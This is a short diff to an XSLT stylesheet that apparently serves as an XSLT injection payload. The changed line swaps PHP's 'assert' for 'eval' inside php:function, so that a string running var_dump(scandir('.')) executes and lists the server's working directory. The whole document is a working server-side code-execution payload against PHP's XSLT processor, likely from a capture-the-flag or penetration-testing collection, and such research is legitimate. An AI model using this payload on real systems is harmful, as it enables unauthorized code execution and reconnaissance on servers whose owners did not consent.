@@ -6,5 +6,5 @@
 <xsl:variable name="eval">
         eval("var_dump(scandir('.'));")
 </xsl:variable>
-<xsl:variable name="preg" select="php:function('assert',$eval)"/>
+<xsl:variable name="preg" select="php:function('eval',$eval)"/>
 </xsl:template></xsl:stylesheet>
